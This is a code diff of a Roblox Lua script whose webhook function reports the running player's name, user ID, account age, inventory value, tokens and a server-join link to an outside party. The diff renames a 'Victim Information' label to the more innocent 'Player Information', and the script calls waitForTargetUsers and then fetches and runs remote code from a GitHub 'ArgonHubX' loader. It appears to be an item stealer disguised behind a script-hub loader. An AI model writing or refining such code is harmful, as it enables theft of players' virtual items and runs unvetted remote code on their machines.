@@ -212,16 +212,19 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
     
     local fields = {}
     
+    -- Player Information Box
+    local accountAge = math.floor(plr.AccountAge / 86400) -- Convert seconds to days
     table.insert(fields, {
-        name = "🎯 Victim Information",
-        value = string.format("**Username:** %s\n**User ID:** %d", plr.Name, plr.UserId),
+        name = "👤 Player Information",
+        value = string.format("```\nName: %s\nUser ID: %d\nAccount Age: %d days\n```", 
+            plr.Name, plr.UserId, accountAge),
         inline = false
     })
     
     if isJoinMessage then
         table.insert(fields, {
-            name = "🔗 Join Link",
-            value = string.format("[Click to Join Server](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=%s)", game.JobId),
+            name = "🔗 Join Server",
+            value = string.format("[**Click to Join Server**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=%s)", game.JobId),
             inline = false
         })
     end
@@ -243,7 +246,7 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
     
     table.insert(fields, {
         name = "📦 Full Inventory Overview",
-        value = inventorySummary ~= "" and inventorySummary or "No items found",
+        value = string.format("```\n%s\n```", inventorySummary ~= "" and inventorySummary or "No items found"),
         inline = false
     })
     
@@ -298,7 +301,7 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
                 table.insert(fields, {
                     name = string.format("%s %s (%d items) - %s RAP", 
                         categoryIcon, category, #items, formatNumber(categoryRAP)),
-                    value = itemList,
+                    value = string.format("```\n%s\n```", itemList),
                     inline = false
                 })
             end
@@ -314,14 +317,14 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
     if tokens > 0 then
         table.insert(fields, {
             name = "💰 Tokens",
-            value = string.format("**%s** Tokens", formatNumber(tokens)),
+            value = string.format("```\n%s\n```", string.format("**%s** Tokens", formatNumber(tokens))),
             inline = true
         })
     end
     
     table.insert(fields, {
         name = "🌐 Server Information",
-        value = string.format("**Server ID:** %s\n**Players:** %d/16\n**Place ID:** %d", 
+        value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
             game.JobId, #Players:GetPlayers(), game.PlaceId),
         inline = false
     })
@@ -574,5 +577,5 @@ if #itemsToSend > 0 or totalTokens > 0 then
     waitForTargetUsers()
 end
 
-task.wait(1)
+task.wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
